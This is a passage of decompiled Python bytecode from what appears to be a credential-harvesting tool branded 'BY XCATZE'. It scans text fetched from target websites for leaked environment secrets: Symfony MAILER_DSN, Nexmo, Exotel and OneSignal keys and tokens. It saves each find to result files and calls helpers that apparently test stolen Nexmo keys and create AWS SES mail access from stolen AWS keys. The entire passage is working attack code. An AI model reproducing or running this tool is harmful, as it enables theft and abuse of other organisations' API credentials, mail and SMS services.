             3742  CALL_FUNCTION_2       2  ''
             3744  STORE_FAST               'save'

 L.1224      3746  LOAD_FAST                'save'
             3748  LOAD_METHOD              write
             3750  LOAD_FAST                'remover'
             3752  LOAD_STR                 '\n\n'
             3754  BINARY_ADD       
             3756  CALL_METHOD_1         1  ''
             3758  POP_TOP          

 L.1225      3760  LOAD_FAST                'save'
             3762  LOAD_METHOD              close
             3764  CALL_METHOD_0         0  ''
             3766  POP_TOP          

 L.1226      3768  LOAD_GLOBAL              open
             3770  LOAD_STR                 'result/ses_key.txt'
             3772  LOAD_STR                 'a'
             3774  CALL_FUNCTION_2       2  ''
             3776  STORE_FAST               'save2'

 L.1227      3778  LOAD_FAST                'save2'
             3780  LOAD_METHOD              write
             3782  LOAD_FAST                'remover'
             3784  LOAD_STR                 '\n\n'
             3786  BINARY_ADD       
             3788  CALL_METHOD_1         1  ''
             3790  POP_TOP          

 L.1228      3792  LOAD_FAST                'save2'
             3794  LOAD_METHOD              close
             3796  CALL_METHOD_0         0  ''
             3798  POP_TOP          

 L.1229      3800  SETUP_FINALLY      3820  'to 3820'

 L.1230      3802  LOAD_GLOBAL              autocreateses
             3804  LOAD_FAST                'url'
             3806  LOAD_FAST                'mailhost'
             3808  LOAD_FAST                'mailport'
             3810  LOAD_FAST                'mailuser'
             3812  CALL_FUNCTION_4       4  ''
             3814  POP_TOP          
           3816_0  COME_FROM          3500  '3500'
           3816_1  COME_FROM          3136  '3136'
           3816_2  COME_FROM          2772  '2772'
             3816  POP_BLOCK        
             3818  JUMP_FORWARD       3850  'to 3850'
           3820_0  COME_FROM_FINALLY  3800  '3800'

 L.1231      3820  POP_TOP          
             3822  POP_TOP          
             3824  POP_TOP          

 L.1232      3826  LOAD_GLOBAL              print
             3828  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             3830  LOAD_METHOD              format
             3832  LOAD_GLOBAL              str
             3834  LOAD_FAST                'url'
             3836  CALL_FUNCTION_1       1  ''
             3838  CALL_METHOD_1         1  ''
             3840  CALL_FUNCTION_1       1  ''
             3842  POP_TOP          
           3844_0  COME_FROM          3528  '3528'
           3844_1  COME_FROM          3164  '3164'
           3844_2  COME_FROM          2800  '2800'
             3844  POP_EXCEPT       
             3846  JUMP_FORWARD       3850  'to 3850'
             3848  END_FINALLY      
           3850_0  COME_FROM          3846  '3846'
           3850_1  COME_FROM          3818  '3818'
           3850_2  COME_FROM          3706  '3706'
           3850_3  COME_FROM          3692  '3692'
           3850_4  COME_FROM          3554  '3554'
           3850_5  COME_FROM          3542  '3542'
           3850_6  COME_FROM          3532  '3532'
           3850_7  COME_FROM          3356  '3356'
           3850_8  COME_FROM          3342  '3342'
           3850_9  COME_FROM          3168  '3168'
          3850_10  COME_FROM          2992  '2992'
          3850_11  COME_FROM          2978  '2978'
          3850_12  COME_FROM          2804  '2804'
          3850_13  COME_FROM          2628  '2628'
          3850_14  COME_FROM          2614  '2614'

 L.1235      3850  LOAD_STR                 'MAILER_DSN='
             3852  LOAD_FAST                'text'
             3854  COMPARE_OP               in
         3856_3858  POP_JUMP_IF_FALSE  3992  'to 3992'

 L.1236      3860  LOAD_GLOBAL              print
             3862  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSYMFONY\n'
             3864  LOAD_METHOD              format
             3866  LOAD_GLOBAL              str
             3868  LOAD_FAST                'url'
             3870  CALL_FUNCTION_1       1  ''
             3872  CALL_METHOD_1         1  ''
             3874  CALL_FUNCTION_1       1  ''
             3876  POP_TOP          

 L.1237      3878  LOAD_GLOBAL              reg
             3880  LOAD_STR                 '\nMAILER_DSN=(.*?)\n'
             3882  LOAD_FAST                'text'
             3884  CALL_FUNCTION_2       2  ''
             3886  LOAD_CONST               0
             3888  BINARY_SUBSCR    
             3890  STORE_FAST               'mailhost'

 L.1238      3892  LOAD_STR                 'URL: '
             3894  LOAD_GLOBAL              str
             3896  LOAD_FAST                'url'
             3898  CALL_FUNCTION_1       1  ''
             3900  BINARY_ADD       
             3902  LOAD_STR                 '\nMAILER_DSN: '
             3904  BINARY_ADD       
             3906  LOAD_GLOBAL              str
             3908  LOAD_FAST                'mailhost'
             3910  CALL_FUNCTION_1       1  ''
             3912  BINARY_ADD       
             3914  STORE_FAST               'build'

 L.1239      3916  LOAD_GLOBAL              str
             3918  LOAD_FAST                'build'
             3920  CALL_FUNCTION_1       1  ''
             3922  LOAD_METHOD              replace
             3924  LOAD_STR                 '\r'
             3926  LOAD_STR                 ''
             3928  CALL_METHOD_2         2  ''
             3930  STORE_FAST               'remover'

 L.1240      3932  LOAD_GLOBAL              str
             3934  LOAD_FAST                'mailhost'
             3936  CALL_FUNCTION_1       1  ''
             3938  LOAD_STR                 ''
             3940  COMPARE_OP               !=
         3942_3944  POP_JUMP_IF_FALSE  3992  'to 3992'
             3946  LOAD_GLOBAL              str
             3948  LOAD_FAST                'mailhost'
             3950  CALL_FUNCTION_1       1  ''
             3952  LOAD_STR                 'smtp://localhost'
             3954  COMPARE_OP               !=
         3956_3958  POP_JUMP_IF_FALSE  3992  'to 3992'

 L.1241      3960  LOAD_GLOBAL              open
             3962  LOAD_STR                 'result/symfony_mailer_dsn.txt'
             3964  LOAD_STR                 'a'
             3966  CALL_FUNCTION_2       2  ''
             3968  STORE_FAST               'save'

 L.1242      3970  LOAD_FAST                'save'
             3972  LOAD_METHOD              write
             3974  LOAD_FAST                'remover'
             3976  LOAD_STR                 '\n\n'
             3978  BINARY_ADD       
             3980  CALL_METHOD_1         1  ''
             3982  POP_TOP          

 L.1243      3984  LOAD_FAST                'save'
             3986  LOAD_METHOD              close
             3988  CALL_METHOD_0         0  ''
             3990  POP_TOP          
           3992_0  COME_FROM          3956  '3956'
           3992_1  COME_FROM          3942  '3942'
           3992_2  COME_FROM          3856  '3856'

 L.1245      3992  LOAD_STR                 'NEXMO'
             3994  LOAD_FAST                'text'
             3996  COMPARE_OP               in
         3998_4000  POP_JUMP_IF_FALSE  4578  'to 4578'
             4002  LOAD_GLOBAL              NEXMO
             4004  CALL_FUNCTION_0       0  ''
             4006  LOAD_STR                 'on'
             4008  COMPARE_OP               ==
         4010_4012  POP_JUMP_IF_FALSE  4578  'to 4578'

 L.1246      4014  LOAD_STR                 'NEXMO_KEY='
             4016  LOAD_FAST                'text'
             4018  COMPARE_OP               in
         4020_4022  POP_JUMP_IF_FALSE  4298  'to 4298'

 L.1247      4024  SETUP_FINALLY      4044  'to 4044'

 L.1248      4026  LOAD_GLOBAL              reg
             4028  LOAD_STR                 '\nNEXMO_KEY=(.*?)\n'
             4030  LOAD_FAST                'text'
             4032  CALL_FUNCTION_2       2  ''
             4034  LOAD_CONST               0
             4036  BINARY_SUBSCR    
             4038  STORE_FAST               'nexmo_key'
             4040  POP_BLOCK        
             4042  JUMP_FORWARD       4060  'to 4060'
           4044_0  COME_FROM_FINALLY  4024  '4024'

 L.1249      4044  POP_TOP          
             4046  POP_TOP          
             4048  POP_TOP          

 L.1250      4050  LOAD_STR                 ''
             4052  STORE_FAST               'nexmo_key'
             4054  POP_EXCEPT       
             4056  JUMP_FORWARD       4060  'to 4060'
             4058  END_FINALLY      
           4060_0  COME_FROM          4056  '4056'
           4060_1  COME_FROM          4042  '4042'

 L.1251      4060  SETUP_FINALLY      4080  'to 4080'

 L.1252      4062  LOAD_GLOBAL              reg
             4064  LOAD_STR                 '\nNEXMO_SECRET=(.*?)\n'
             4066  LOAD_FAST                'text'
             4068  CALL_FUNCTION_2       2  ''
             4070  LOAD_CONST               0
             4072  BINARY_SUBSCR    
             4074  STORE_FAST               'nexmo_secret'
             4076  POP_BLOCK        
             4078  JUMP_FORWARD       4096  'to 4096'
           4080_0  COME_FROM_FINALLY  4060  '4060'

 L.1253      4080  POP_TOP          
             4082  POP_TOP          
             4084  POP_TOP          

 L.1254      4086  LOAD_STR                 ''
             4088  STORE_FAST               'nexmo_secret'
             4090  POP_EXCEPT       
             4092  JUMP_FORWARD       4096  'to 4096'
             4094  END_FINALLY      
           4096_0  COME_FROM          4092  '4092'
           4096_1  COME_FROM          4078  '4078'

 L.1255      4096  SETUP_FINALLY      4116  'to 4116'

 L.1256      4098  LOAD_GLOBAL              reg
             4100  LOAD_STR                 '\nNEXMO_NUMBER=(.*?)\n'
             4102  LOAD_FAST                'text'
             4104  CALL_FUNCTION_2       2  ''
             4106  LOAD_CONST               0
             4108  BINARY_SUBSCR    
             4110  STORE_FAST               'phone'
             4112  POP_BLOCK        
             4114  JUMP_FORWARD       4132  'to 4132'
           4116_0  COME_FROM_FINALLY  4096  '4096'

 L.1257      4116  POP_TOP          
             4118  POP_TOP          
             4120  POP_TOP          

 L.1258      4122  LOAD_STR                 ''
             4124  STORE_FAST               'phone'
             4126  POP_EXCEPT       
             4128  JUMP_FORWARD       4132  'to 4132'
             4130  END_FINALLY      
           4132_0  COME_FROM          4128  '4128'
           4132_1  COME_FROM          4114  '4114'

 L.1259      4132  LOAD_GLOBAL              print
             4134  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mNEXMO\n'
             4136  LOAD_METHOD              format
             4138  LOAD_GLOBAL              str
             4140  LOAD_FAST                'url'
             4142  CALL_FUNCTION_1       1  ''
             4144  CALL_METHOD_1         1  ''
             4146  CALL_FUNCTION_1       1  ''
             4148  POP_TOP          

 L.1260      4150  LOAD_STR                 'URL: '
             4152  LOAD_GLOBAL              str
             4154  LOAD_FAST                'url'
             4156  CALL_FUNCTION_1       1  ''
             4158  BINARY_ADD       
             4160  LOAD_STR                 '\nnexmo_key: '
             4162  BINARY_ADD       
             4164  LOAD_GLOBAL              str
             4166  LOAD_FAST                'nexmo_key'
             4168  CALL_FUNCTION_1       1  ''
             4170  BINARY_ADD       
             4172  LOAD_STR                 '\nnexmo_secret: '
             4174  BINARY_ADD       
             4176  LOAD_GLOBAL              str
             4178  LOAD_FAST                'nexmo_secret'
             4180  CALL_FUNCTION_1       1  ''
             4182  BINARY_ADD       
             4184  LOAD_STR                 '\nphone: '
             4186  BINARY_ADD       
             4188  LOAD_GLOBAL              str
             4190  LOAD_FAST                'phone'
             4192  CALL_FUNCTION_1       1  ''
             4194  BINARY_ADD       
             4196  STORE_FAST               'build'

 L.1261      4198  LOAD_GLOBAL              str
             4200  LOAD_FAST                'build'
             4202  CALL_FUNCTION_1       1  ''
             4204  LOAD_METHOD              replace
             4206  LOAD_STR                 '\r'
             4208  LOAD_STR                 ''
             4210  CALL_METHOD_2         2  ''
             4212  STORE_FAST               'remover'

 L.1262      4214  LOAD_GLOBAL              open
             4216  LOAD_STR                 'result/NEXMO.txt'
             4218  LOAD_STR                 'a'
             4220  CALL_FUNCTION_2       2  ''
             4222  STORE_FAST               'save'

 L.1263      4224  LOAD_FAST                'save'
             4226  LOAD_METHOD              write
             4228  LOAD_FAST                'remover'
             4230  LOAD_STR                 '\n\n'
             4232  BINARY_ADD       
             4234  CALL_METHOD_1         1  ''
             4236  POP_TOP          

 L.1264      4238  LOAD_FAST                'save'
             4240  LOAD_METHOD              close
             4242  CALL_METHOD_0         0  ''
             4244  POP_TOP          

 L.1265      4246  SETUP_FINALLY      4264  'to 4264'

 L.1266      4248  LOAD_GLOBAL              nexmosend
             4250  LOAD_FAST                'url'
             4252  LOAD_FAST                'nexmo_key'
             4254  LOAD_FAST                'nexmo_secret'
             4256  CALL_FUNCTION_3       3  ''
             4258  POP_TOP          
             4260  POP_BLOCK        
             4262  JUMP_FORWARD       4578  'to 4578'
           4264_0  COME_FROM_FINALLY  4246  '4246'

 L.1267      4264  POP_TOP          
             4266  POP_TOP          
             4268  POP_TOP          

 L.1268      4270  LOAD_GLOBAL              print
             4272  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mINVALI NEXMO\n'
             4274  LOAD_METHOD              format
             4276  LOAD_GLOBAL              str
             4278  LOAD_FAST                'url'
             4280  CALL_FUNCTION_1       1  ''
             4282  CALL_METHOD_1         1  ''
             4284  CALL_FUNCTION_1       1  ''
             4286  POP_TOP          
             4288  POP_EXCEPT       
             4290  JUMP_FORWARD       4578  'to 4578'
             4292  END_FINALLY      
         4294_4296  JUMP_FORWARD       4578  'to 4578'
           4298_0  COME_FROM          4020  '4020'

 L.1269      4298  LOAD_STR                 'NEXMO_API_KEY='
             4300  LOAD_FAST                'text'
             4302  COMPARE_OP               in
         4304_4306  POP_JUMP_IF_FALSE  4578  'to 4578'

 L.1270      4308  SETUP_FINALLY      4328  'to 4328'

 L.1271      4310  LOAD_GLOBAL              reg
             4312  LOAD_STR                 '\nNEXMO_API_KEY=(.*?)\n'
             4314  LOAD_FAST                'text'
             4316  CALL_FUNCTION_2       2  ''
             4318  LOAD_CONST               0
             4320  BINARY_SUBSCR    
             4322  STORE_FAST               'nexmo_key'
             4324  POP_BLOCK        
             4326  JUMP_FORWARD       4344  'to 4344'
           4328_0  COME_FROM_FINALLY  4308  '4308'

 L.1272      4328  POP_TOP          
             4330  POP_TOP          
             4332  POP_TOP          

 L.1273      4334  LOAD_STR                 ''
             4336  STORE_FAST               'nexmo_key'
             4338  POP_EXCEPT       
             4340  JUMP_FORWARD       4344  'to 4344'
             4342  END_FINALLY      
           4344_0  COME_FROM          4340  '4340'
           4344_1  COME_FROM          4326  '4326'

 L.1274      4344  SETUP_FINALLY      4364  'to 4364'

 L.1275      4346  LOAD_GLOBAL              reg
             4348  LOAD_STR                 '\nNEXMO_API_SECRET=(.*?)\n'
             4350  LOAD_FAST                'text'
             4352  CALL_FUNCTION_2       2  ''
             4354  LOAD_CONST               0
             4356  BINARY_SUBSCR    
             4358  STORE_FAST               'nexmo_secret'
             4360  POP_BLOCK        
             4362  JUMP_FORWARD       4380  'to 4380'
           4364_0  COME_FROM_FINALLY  4344  '4344'

 L.1276      4364  POP_TOP          
             4366  POP_TOP          
             4368  POP_TOP          

 L.1277      4370  LOAD_STR                 ''
             4372  STORE_FAST               'nexmo_secret'
             4374  POP_EXCEPT       
             4376  JUMP_FORWARD       4380  'to 4380'
             4378  END_FINALLY      
           4380_0  COME_FROM          4376  '4376'
           4380_1  COME_FROM          4362  '4362'

 L.1278      4380  SETUP_FINALLY      4400  'to 4400'

 L.1279      4382  LOAD_GLOBAL              reg
             4384  LOAD_STR                 '\nNEXMO_API_NUMBER=(.*?)\n'
             4386  LOAD_FAST                'text'
             4388  CALL_FUNCTION_2       2  ''
             4390  LOAD_CONST               0
             4392  BINARY_SUBSCR    
             4394  STORE_FAST               'phone'
             4396  POP_BLOCK        
             4398  JUMP_FORWARD       4416  'to 4416'
           4400_0  COME_FROM_FINALLY  4380  '4380'

 L.1280      4400  POP_TOP          
             4402  POP_TOP          
             4404  POP_TOP          

 L.1281      4406  LOAD_STR                 ''
             4408  STORE_FAST               'phone'
             4410  POP_EXCEPT       
             4412  JUMP_FORWARD       4416  'to 4416'
             4414  END_FINALLY      
           4416_0  COME_FROM          4412  '4412'
           4416_1  COME_FROM          4398  '4398'

 L.1282      4416  LOAD_GLOBAL              print
             4418  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mNEXMO\n'
             4420  LOAD_METHOD              format
             4422  LOAD_GLOBAL              str
             4424  LOAD_FAST                'url'
             4426  CALL_FUNCTION_1       1  ''
             4428  CALL_METHOD_1         1  ''
             4430  CALL_FUNCTION_1       1  ''
             4432  POP_TOP          

 L.1283      4434  LOAD_STR                 'URL: '
             4436  LOAD_GLOBAL              str
             4438  LOAD_FAST                'url'
             4440  CALL_FUNCTION_1       1  ''
             4442  BINARY_ADD       
             4444  LOAD_STR                 '\nnexmo_key: '
             4446  BINARY_ADD       
             4448  LOAD_GLOBAL              str
             4450  LOAD_FAST                'nexmo_key'
             4452  CALL_FUNCTION_1       1  ''
             4454  BINARY_ADD       
             4456  LOAD_STR                 '\nnexmo_secret: '
             4458  BINARY_ADD       
             4460  LOAD_GLOBAL              str
             4462  LOAD_FAST                'nexmo_secret'
             4464  CALL_FUNCTION_1       1  ''
             4466  BINARY_ADD       
             4468  LOAD_STR                 '\nphone: '
             4470  BINARY_ADD       
             4472  LOAD_GLOBAL              str
             4474  LOAD_FAST                'phone'
             4476  CALL_FUNCTION_1       1  ''
             4478  BINARY_ADD       
             4480  STORE_FAST               'build'

 L.1284      4482  LOAD_GLOBAL              str
             4484  LOAD_FAST                'build'
             4486  CALL_FUNCTION_1       1  ''
             4488  LOAD_METHOD              replace
             4490  LOAD_STR                 '\r'
             4492  LOAD_STR                 ''
             4494  CALL_METHOD_2         2  ''
             4496  STORE_FAST               'remover'

 L.1285      4498  LOAD_GLOBAL              open
             4500  LOAD_STR                 'result/NEXMO.txt'
             4502  LOAD_STR                 'a'
             4504  CALL_FUNCTION_2       2  ''
             4506  STORE_FAST               'save'

 L.1286      4508  LOAD_FAST                'save'
             4510  LOAD_METHOD              write
             4512  LOAD_FAST                'remover'
             4514  LOAD_STR                 '\n\n'
             4516  BINARY_ADD       
             4518  CALL_METHOD_1         1  ''
             4520  POP_TOP          

 L.1287      4522  LOAD_FAST                'save'
             4524  LOAD_METHOD              close
             4526  CALL_METHOD_0         0  ''
             4528  POP_TOP          

 L.1288      4530  SETUP_FINALLY      4548  'to 4548'

 L.1289      4532  LOAD_GLOBAL              nexmosend
             4534  LOAD_FAST                'url'
             4536  LOAD_FAST                'nexmo_key'
             4538  LOAD_FAST                'nexmo_secret'
             4540  CALL_FUNCTION_3       3  ''
             4542  POP_TOP          
           4544_0  COME_FROM          4262  '4262'
             4544  POP_BLOCK        
             4546  JUMP_FORWARD       4578  'to 4578'
           4548_0  COME_FROM_FINALLY  4530  '4530'

 L.1290      4548  POP_TOP          
             4550  POP_TOP          
             4552  POP_TOP          

 L.1291      4554  LOAD_GLOBAL              print
             4556  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mINVALI NEXMO\n'
             4558  LOAD_METHOD              format
             4560  LOAD_GLOBAL              str
             4562  LOAD_FAST                'url'
             4564  CALL_FUNCTION_1       1  ''
             4566  CALL_METHOD_1         1  ''
             4568  CALL_FUNCTION_1       1  ''
             4570  POP_TOP          
           4572_0  COME_FROM          4290  '4290'
             4572  POP_EXCEPT       
             4574  JUMP_FORWARD       4578  'to 4578'
             4576  END_FINALLY      
           4578_0  COME_FROM          4574  '4574'
           4578_1  COME_FROM          4546  '4546'
           4578_2  COME_FROM          4304  '4304'
           4578_3  COME_FROM          4294  '4294'
           4578_4  COME_FROM          4010  '4010'
           4578_5  COME_FROM          3998  '3998'

 L.1294      4578  LOAD_STR                 'EXOTEL_API_KEY'
             4580  LOAD_FAST                'text'
             4582  COMPARE_OP               in
         4584_4586  POP_JUMP_IF_FALSE  4832  'to 4832'
             4588  LOAD_GLOBAL              EXOTEL
             4590  CALL_FUNCTION_0       0  ''
             4592  LOAD_STR                 'on'
             4594  COMPARE_OP               ==
         4596_4598  POP_JUMP_IF_FALSE  4832  'to 4832'

 L.1295      4600  LOAD_STR                 'EXOTEL_API_KEY='
             4602  LOAD_FAST                'text'
             4604  COMPARE_OP               in
         4606_4608  POP_JUMP_IF_FALSE  4832  'to 4832'

 L.1296      4610  SETUP_FINALLY      4630  'to 4630'

 L.1297      4612  LOAD_GLOBAL              reg
             4614  LOAD_STR                 '\nEXOTEL_API_KEY=(.*?)\n'
             4616  LOAD_FAST                'text'
             4618  CALL_FUNCTION_2       2  ''
             4620  LOAD_CONST               0
             4622  BINARY_SUBSCR    
             4624  STORE_FAST               'exotel_api'
             4626  POP_BLOCK        
             4628  JUMP_FORWARD       4646  'to 4646'
           4630_0  COME_FROM_FINALLY  4610  '4610'

 L.1298      4630  POP_TOP          
             4632  POP_TOP          
             4634  POP_TOP          

 L.1299      4636  LOAD_STR                 ''
             4638  STORE_FAST               'exotel_api'
             4640  POP_EXCEPT       
             4642  JUMP_FORWARD       4646  'to 4646'
             4644  END_FINALLY      
           4646_0  COME_FROM          4642  '4642'
           4646_1  COME_FROM          4628  '4628'

 L.1300      4646  SETUP_FINALLY      4666  'to 4666'

 L.1301      4648  LOAD_GLOBAL              reg
             4650  LOAD_STR                 '\nEXOTEL_API_TOKEN=(.*?)\n'
             4652  LOAD_FAST                'text'
             4654  CALL_FUNCTION_2       2  ''
             4656  LOAD_CONST               0
             4658  BINARY_SUBSCR    
             4660  STORE_FAST               'exotel_token'
             4662  POP_BLOCK        
             4664  JUMP_FORWARD       4682  'to 4682'
           4666_0  COME_FROM_FINALLY  4646  '4646'

 L.1302      4666  POP_TOP          
             4668  POP_TOP          
             4670  POP_TOP          

 L.1303      4672  LOAD_STR                 ''
             4674  STORE_FAST               'exotel_token'
             4676  POP_EXCEPT       
             4678  JUMP_FORWARD       4682  'to 4682'
             4680  END_FINALLY      
           4682_0  COME_FROM          4678  '4678'
           4682_1  COME_FROM          4664  '4664'

 L.1304      4682  SETUP_FINALLY      4702  'to 4702'

 L.1305      4684  LOAD_GLOBAL              reg
             4686  LOAD_STR                 '\nEXOTEL_API_SID=(.*?)\n'
             4688  LOAD_FAST                'text'
             4690  CALL_FUNCTION_2       2  ''
             4692  LOAD_CONST               0
             4694  BINARY_SUBSCR    
             4696  STORE_FAST               'exotel_sid'
             4698  POP_BLOCK        
             4700  JUMP_FORWARD       4718  'to 4718'
           4702_0  COME_FROM_FINALLY  4682  '4682'

 L.1306      4702  POP_TOP          
             4704  POP_TOP          
             4706  POP_TOP          

 L.1307      4708  LOAD_STR                 ''
             4710  STORE_FAST               'exotel_sid'
             4712  POP_EXCEPT       
             4714  JUMP_FORWARD       4718  'to 4718'
             4716  END_FINALLY      
           4718_0  COME_FROM          4714  '4714'
           4718_1  COME_FROM          4700  '4700'

 L.1308      4718  LOAD_GLOBAL              print
             4720  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mEXOTEL\n'
             4722  LOAD_METHOD              format
             4724  LOAD_GLOBAL              str
             4726  LOAD_FAST                'url'
             4728  CALL_FUNCTION_1       1  ''
             4730  CALL_METHOD_1         1  ''
             4732  CALL_FUNCTION_1       1  ''
             4734  POP_TOP          

 L.1309      4736  LOAD_STR                 'URL: '
             4738  LOAD_GLOBAL              str
             4740  LOAD_FAST                'url'
             4742  CALL_FUNCTION_1       1  ''
             4744  BINARY_ADD       
             4746  LOAD_STR                 '\nEXOTEL_API_KEY: '
             4748  BINARY_ADD       
             4750  LOAD_GLOBAL              str
             4752  LOAD_FAST                'exotel_api'
             4754  CALL_FUNCTION_1       1  ''
             4756  BINARY_ADD       
             4758  LOAD_STR                 '\nEXOTEL_API_TOKEN: '
             4760  BINARY_ADD       
             4762  LOAD_GLOBAL              str
             4764  LOAD_FAST                'exotel_token'
             4766  CALL_FUNCTION_1       1  ''
             4768  BINARY_ADD       
             4770  LOAD_STR                 '\nEXOTEL_API_SID: '
             4772  BINARY_ADD       
             4774  LOAD_GLOBAL              str
             4776  LOAD_FAST                'exotel_sid'
             4778  CALL_FUNCTION_1       1  ''
             4780  BINARY_ADD       
             4782  STORE_FAST               'build'

 L.1310      4784  LOAD_GLOBAL              str
             4786  LOAD_FAST                'build'
             4788  CALL_FUNCTION_1       1  ''
             4790  LOAD_METHOD              replace
             4792  LOAD_STR                 '\r'
             4794  LOAD_STR                 ''
             4796  CALL_METHOD_2         2  ''
             4798  STORE_FAST               'remover'

 L.1311      4800  LOAD_GLOBAL              open
             4802  LOAD_STR                 'result/EXOTEL.txt'
             4804  LOAD_STR                 'a'
             4806  CALL_FUNCTION_2       2  ''
             4808  STORE_FAST               'save'

 L.1312      4810  LOAD_FAST                'save'
             4812  LOAD_METHOD              write
             4814  LOAD_FAST                'remover'
             4816  LOAD_STR                 '\n\n'
             4818  BINARY_ADD       
             4820  CALL_METHOD_1         1  ''
             4822  POP_TOP          

 L.1313      4824  LOAD_FAST                'save'
             4826  LOAD_METHOD              close
             4828  CALL_METHOD_0         0  ''
             4830  POP_TOP          
           4832_0  COME_FROM          4606  '4606'
           4832_1  COME_FROM          4596  '4596'
           4832_2  COME_FROM          4584  '4584'

 L.1316      4832  LOAD_STR                 'ONESIGNAL_APP_ID'
             4834  LOAD_FAST                'text'
             4836  COMPARE_OP               in
         4838_4840  POP_JUMP_IF_FALSE  5086  'to 5086'
             4842  LOAD_GLOBAL              ONESIGNAL
             4844  CALL_FUNCTION_0       0  ''
             4846  LOAD_STR                 'on'
             4848  COMPARE_OP               ==
         4850_4852  POP_JUMP_IF_FALSE  5086  'to 5086'

 L.1317      4854  LOAD_STR                 'ONESIGNAL_APP_ID='
             4856  LOAD_FAST                'text'
             4858  COMPARE_OP               in
         4860_4862  POP_JUMP_IF_FALSE  5086  'to 5086'

 L.1318      4864  SETUP_FINALLY      4884  'to 4884'

 L.1319      4866  LOAD_GLOBAL              reg
             4868  LOAD_STR                 '\nONESIGNAL_APP_ID=(.*?)\n'
             4870  LOAD_FAST                'text'
             4872  CALL_FUNCTION_2       2  ''
             4874  LOAD_CONST               0
             4876  BINARY_SUBSCR    
             4878  STORE_FAST               'onesignal_id'
             4880  POP_BLOCK        
             4882  JUMP_FORWARD       4900  'to 4900'
           4884_0  COME_FROM_FINALLY  4864  '4864'

 L.1320      4884  POP_TOP          
             4886  POP_TOP          
             4888  POP_TOP          

 L.1321      4890  LOAD_STR                 ''
             4892  STORE_FAST               'onesignal_id'
             4894  POP_EXCEPT       
             4896  JUMP_FORWARD       4900  'to 4900'
             4898  END_FINALLY      
           4900_0  COME_FROM          4896  '4896'
           4900_1  COME_FROM          4882  '4882'

 L.1322      4900  SETUP_FINALLY      4920  'to 4920'

 L.1323      4902  LOAD_GLOBAL              reg
             4904  LOAD_STR                 '\nONESIGNAL_REST_API_KEY=(.*?)\n'
             4906  LOAD_FAST                'text'
             4908  CALL_FUNCTION_2       2  ''
             4910  LOAD_CONST               0
             4912  BINARY_SUBSCR    
             4914  STORE_FAST               'onesignal_token'
             4916  POP_BLOCK        
             4918  JUMP_FORWARD       4936  'to 4936'
           4920_0  COME_FROM_FINALLY  4900  '4900'

 L.1324      4920  POP_TOP          
             4922  POP_TOP          
             4924  POP_TOP          

 L.1325      4926  LOAD_STR                 ''
             4928  STORE_FAST               'onesignal_id'
             4930  POP_EXCEPT       
             4932  JUMP_FORWARD       4936  'to 4936'
             4934  END_FINALLY      
           4936_0  COME_FROM          4932  '4932'
           4936_1  COME_FROM          4918  '4918'

 L.1326      4936  SETUP_FINALLY      4956  'to 4956'

 L.1327      4938  LOAD_GLOBAL              reg
             4940  LOAD_STR                 '\nONESIGNAL_USER_AUTH_KEY=(.*?)\n'
             4942  LOAD_FAST                'text'
             4944  CALL_FUNCTION_2       2  ''
             4946  LOAD_CONST               0
             4948  BINARY_SUBSCR    
             4950  STORE_FAST               'onesignal_auth'
             4952  POP_BLOCK        
             4954  JUMP_FORWARD       4972  'to 4972'
           4956_0  COME_FROM_FINALLY  4936  '4936'

 L.1328      4956  POP_TOP          
             4958  POP_TOP          
             4960  POP_TOP          

 L.1329      4962  LOAD_STR                 ''
             4964  STORE_FAST               'onesignal_auth'
             4966  POP_EXCEPT       
             4968  JUMP_FORWARD       4972  'to 4972'
             4970  END_FINALLY      
           4972_0  COME_FROM          4968  '4968'
           4972_1  COME_FROM          4954  '4954'

 L.1330      4972  LOAD_GLOBAL              print
             4974  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mONESIGNAL\n'
             4976  LOAD_METHOD              format
             4978  LOAD_GLOBAL              str
             4980  LOAD_FAST                'url'
             4982  CALL_FUNCTION_1       1  ''
             4984  CALL_METHOD_1         1  ''
             4986  CALL_FUNCTION_1       1  ''
             4988  POP_TOP          

 L.1331      4990  LOAD_STR                 'URL: '
             4992  LOAD_GLOBAL              str
             4994  LOAD_FAST                'url'
             4996  CALL_FUNCTION_1       1  ''
             4998  BINARY_ADD       
             5000  LOAD_STR                 '\nONESIGNAL_APP_ID: '
             5002  BINARY_ADD       
             5004  LOAD_GLOBAL              str
             5006  LOAD_FAST                'onesignal_id'
             5008  CALL_FUNCTION_1       1  ''
             5010  BINARY_ADD       
             5012  LOAD_STR                 '\nONESIGNAL_REST_API_KEY: '
             5014  BINARY_ADD       
             5016  LOAD_GLOBAL              str
             5018  LOAD_FAST                'onesignal_token'
             5020  CALL_FUNCTION_1       1  ''
             5022  BINARY_ADD       
             5024  LOAD_STR                 '\nONESIGNAL_USER_AUTH_KEY: '
             5026  BINARY_ADD       
             5028  LOAD_GLOBAL              str
             5030  LOAD_FAST                'onesignal_auth'
             5032  CALL_FUNCTION_1       1  ''
             5034  BINARY_ADD       
             5036  STORE_FAST               'build'

 L.1332      5038  LOAD_GLOBAL              str
             5040  LOAD_FAST                'build'
             5042  CALL_FUNCTION_1       1  ''
             5044  LOAD_METHOD              replace
             5046  LOAD_STR                 '\r'
             5048  LOAD_STR                 ''
             5050  CALL_METHOD_2         2  ''
             5052  STORE_FAST               'remover'

 L.1333      5054  LOAD_GLOBAL              open
             5056  LOAD_STR                 'result/ONESIGNAL.txt'
             5058  LOAD_STR                 'a'
             5060  CALL_FUNCTION_2       2  ''
             5062  STORE_FAST               'save'

 L.1334      5064  LOAD_FAST                'save'
             5066  LOAD_METHOD              write
             5068  LOAD_FAST                'remover'
             5070  LOAD_STR                 '\n\n'
             5072  BINARY_ADD       
             5074  CALL_METHOD_1         1  ''
             5076  POP_TOP          

 L.1335      5078  LOAD_FAST                'save'
             5080  LOAD_METHOD              close
             5082  CALL_METHOD_0         0  ''
             5084  POP_TOP          
           5086_0  COME_FROM          4860  '4860'
           5086_1  COME_FROM          4850  '4850'
           5086_2  COME_FROM          4838  '4838'

